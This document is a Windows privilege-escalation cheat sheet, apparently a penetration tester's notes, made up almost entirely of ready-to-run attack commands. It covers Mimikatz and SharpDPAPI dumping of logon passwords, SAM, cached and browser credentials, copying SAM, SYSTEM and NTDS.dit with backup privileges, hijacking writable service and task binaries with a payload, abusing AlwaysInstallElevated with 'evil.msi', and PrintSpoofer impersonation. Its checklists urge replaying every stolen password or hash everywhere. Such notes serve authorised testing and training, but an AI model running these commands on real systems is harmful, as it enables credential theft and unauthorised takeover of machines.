# Windows Privilege Escalation

## PEASS collection and parsing
```text
Use [[Shell Delivery and Transfer]].
```

## Run PrivescCheck
```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

## Show current user and privileges
```cmd
whoami /all
```

## List local admins
```cmd
net localgroup Administrators
```

## Show network and local-only services
```cmd
ipconfig /all
route print
netstat -ano
```

## List installed software
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
```

## List processes with command lines
```powershell
Get-CimInstance Win32_Process | Select-Object ProcessId,Name,CommandLine
```

## Search for useful files
```powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.cfg,*.xml,*.kdbx,*.exe,*.zip -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.db,*.sqlite,*.sql -Recurse -ErrorAction SilentlyContinue
```

## Loot triage checklist
```text
Pull and review first:
- .env, web.config, unattend, sysprep, export, backup, zip, bak
- scripts, scheduled task actions, service configs, installer leftovers
- Jenkins home, job workspaces, build history, users, secrets
- browser data, PSReadLine, cmdkey, Credential Manager, DPAPI blobs
- database files, connection strings, saved RDP files

Every recovered password or hash gets replayed everywhere before you go hunting for a new bug.
```

## Find PSReadLine history
```powershell
Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue
```

## Check autologon and saved creds
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
cmdkey /list
```

## Find Credential Manager and DPAPI artifacts
```powershell
Get-ChildItem -Path C:\Users\*\AppData\Local\Microsoft\Credentials -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Credentials -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Protect -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login* -Force -ErrorAction SilentlyContinue
```

## Check VNC creds in registry
```cmd
reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v password
reg query HKLM\SOFTWARE\TightVNC\Server
```

## Mimikatz logonpasswords
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > logonpasswords.txt
```

## Dump cached credentials and SAM
```cmd
.\mimikatz.exe "privilege::debug" "lsadump::cache" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

## Triage DPAPI credential blobs
```cmd
.\mimikatz.exe "dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<blob>" "exit"
.\mimikatz.exe "sekurlsa::dpapi" "exit"
```

## Dump browser and Credential Manager secrets with SharpDPAPI
```cmd
SharpDPAPI.exe credentials /unprotect
SharpDPAPI.exe browser /unprotect
```

## List services with paths
```cmd
wmic service get name,displayname,pathname,startmode
```

## Find unquoted service paths
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

## Find modifiable service files with PowerUp
```powershell
. .\PowerUp.ps1; Get-ModifiableServiceFile
```

## Validate service binary permissions
```cmd
sc qc <service_name>
icacls "C:\path\to\service.exe"
accesschk.exe -wvu "C:\path\to\service.exe"
```

## Validate service directory permissions
```cmd
icacls "C:\path\to"
accesschk.exe -wvdq "C:\path\to"
```

## Abuse a writable service binary
```cmd
copy C:\Temp\payload.exe "C:\path\to\service.exe"
sc stop <service_name>
sc start <service_name>
```

## List scheduled tasks
```cmd
schtasks /query /fo LIST /v
```

## Extract task command path
```cmd
schtasks /query /fo LIST /v | findstr /B /C:"Task To Run"
```

## Validate task binary permissions
```cmd
icacls "C:\path\to\task.exe"
accesschk.exe -wvu "C:\path\to\task.exe"
```

## Abuse a writable task binary
```cmd
copy C:\Temp\payload.exe "C:\path\to\task.exe"
schtasks /run /tn "<task name>"
```

## Check AlwaysInstallElevated
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Abuse AlwaysInstallElevated
```cmd
msiexec /quiet /qn /i evil.msi
```

## Check SeBackup / SeRestore privilege
```cmd
whoami /priv
```

## Save SAM and SYSTEM with SeBackupPrivilege
```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

## Copy protected files with robocopy backup mode
```cmd
robocopy /b C:\Windows\NTDS C:\Temp ntds.dit
robocopy /b C:\Windows\System32\config C:\Temp SAM SYSTEM SECURITY
```

## Use a potato if SeImpersonatePrivilege is present
```cmd
.\PrintSpoofer64.exe -i -c "cmd"
```

## Quick Jenkins triage
```powershell
Get-ChildItem -Path C:\Users\*\AppData\Local\Jenkins\.jenkins -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ProgramData\Jenkins -Recurse -ErrorAction SilentlyContinue
```

## Jenkins files worth pulling
```text
- users\*\config.xml
- credentials.xml
- secrets\
- jobs\*\config.xml
- jobs\*\builds\
- workspace\
- nodes\
```

## Shell delivery and file transfer
```text
Use [[Shell Delivery and Transfer]].
```

## Post-exploitation after admin or SYSTEM
```text
Do this before pivoting:
- read Mimikatz output fully
- read all PSReadLine history
- search for unusual files, db files, configs, saved creds
- crack archives and inspect the contents, not just the filenames
- if a service is localhost-only, expose it now
- pull Credential Manager / DPAPI artifacts while you still have context
- check ipconfig /all, netstat -ano, arp -a
- if domain joined, rerun AD enumeration from this host
- test every found password/hash everywhere
```

## Resources
- Priv2Admin: https://github.com/gtworek/Priv2Admin
- LOLBAS: https://lolbas-project.github.io/
